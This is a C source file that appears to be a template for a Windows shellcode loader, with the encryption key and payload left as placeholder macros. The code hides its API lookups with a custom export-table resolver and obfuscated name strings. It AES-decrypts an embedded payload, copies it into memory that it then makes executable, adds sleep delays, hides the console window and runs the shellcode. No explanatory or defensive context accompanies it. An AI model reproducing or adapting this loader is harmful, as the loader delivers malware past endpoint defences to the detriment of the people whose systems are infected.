#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include <string.h>
#include <tlhelp32.h>

// Define the NtAllocateVirtualMemory function pointer
typedef NTSTATUS(WINAPI* PNTALLOCATEVIRTUALMEMORY)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
    );

// Define the NtFreeVirtualMemory function pointer
typedef NTSTATUS(WINAPI* PNTFREEVIRTUALMEMORY)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG FreeType
    );

typedef NTSTATUS(WINAPI* PNTPROTECTVIRTUALMEMORY)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

// Custom GetProcAddress function
typedef FARPROC(__stdcall* ARPROC)(HMODULE, LPCSTR);

FARPROC gettingGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule +
        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* addressOfFunctions = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfFunctions);
    WORD* addressOfNameOrdinals = (WORD*)((BYTE*)hModule + exportDirectory->AddressOfNameOrdinals);
    DWORD* addressOfNames = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfNames);

    for (DWORD i = 0; i < exportDirectory->NumberOfNames; ++i) {
        if (strcmp(lpProcName, (const char*)hModule + addressOfNames[i]) == 0) {
            return (FARPROC)((BYTE*)hModule + addressOfFunctions[addressOfNameOrdinals[i]]);
        }
    }

    return NULL;
}

unsigned char eebq[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
unsigned char zXyv[] = { 'N', 't', 'D', 'e', 'l', 'a', 'y', 'E', 'x', 'e', 'c', 'u', 't', 'i', 'o', 'n', 0x0 };
unsigned char GHIp[] = { 'Z', 'w', 'S', 'e', 't', 'T', 'i', 'm', 'e', 'r', 'R', 'e', 's', 'o', 'l', 'u', 't', 'i', 'o', 'n', 0x0 };

static NTSTATUS(__stdcall *NtDelayExecution)(BOOL Alertable, PLARGE_INTEGER DelayInterval) = (NTSTATUS(__stdcall*)(BOOL, PLARGE_INTEGER))  gettingGetProcAddress(GetModuleHandle(eebq), zXyv);

static NTSTATUS(__stdcall *ZwSetTimerResolution)(IN ULONG RequestedResolution, IN BOOLEAN Set, OUT PULONG ActualResolution) = (NTSTATUS(__stdcall*)(ULONG, BOOLEAN, PULONG))  gettingGetProcAddress(GetModuleHandle(eebq), GHIp);



static void Random4(float milliseconds) {
    static bool once = true;
    if (once) {
        ULONG actualResolution;
        ZwSetTimerResolution(1, true, &actualResolution);
        once = false;
    }

    LARGE_INTEGER interval;
    interval.QuadPart = -1 * (int)(milliseconds * 10000.0f);
    NtDelayExecution(false, &interval);
}

int Random1(char * difern, unsigned int difern_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, difern, &difern_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}

	char Random2[] = KEYVALUE
	unsigned char Random3[] = PAYVAL
	unsigned int Random7_len = sizeof(Random3);


int main() {
PNTPROTECTVIRTUALMEMORY NtProtectVirtualMemory =
        (PNTPROTECTVIRTUALMEMORY) gettingGetProcAddress(GetModuleHandleA(eebq), "NtProtectVirtualMemory");

    // Load the NtAllocateVirtualMemory function from ntdll.dll
    PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory =
        (PNTALLOCATEVIRTUALMEMORY) gettingGetProcAddress(GetModuleHandleA(eebq), "NtAllocateVirtualMemory");
    FreeConsole();
    // Allocate Virtual Memory  
    void* exec = NULL;
    SIZE_T size = sizeof(Random3);
    NTSTATUS status = NtAllocateVirtualMemory(
        GetCurrentProcess(),
        &exec,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    Random1((char *) Random3, Random7_len, Random2, sizeof(Random2));
    
    Random4(1500);
    // Copy shellcode into allocated memory 
    RtlCopyMemory(exec, Random3, sizeof(Random3));
    Random4(1560);
    // Change the memory protection to RX (Read and Execute)
    DWORD oldProtect;
    if (VirtualProtect(exec, size, PAGE_EXECUTE_READ, &oldProtect) == 0) {
        // Handle error if needed
        return -1;
    }

    ((void(*)())exec)();

    // Execute shellcode in memory  
    ((void(*)())exec)();
    Random4(2540);
    // Free the allocated memory using NtFreeVirtualMemory
    PNTFREEVIRTUALMEMORY NtFreeVirtualMemory =
        (PNTFREEVIRTUALMEMORY) gettingGetProcAddress(GetModuleHandleA(eebq), "NtFreeVirtualMemory");
    SIZE_T regionSize = 0;
    status = NtFreeVirtualMemory(GetCurrentProcess(), &exec, &regionSize, MEM_RELEASE);

    return 0;
}
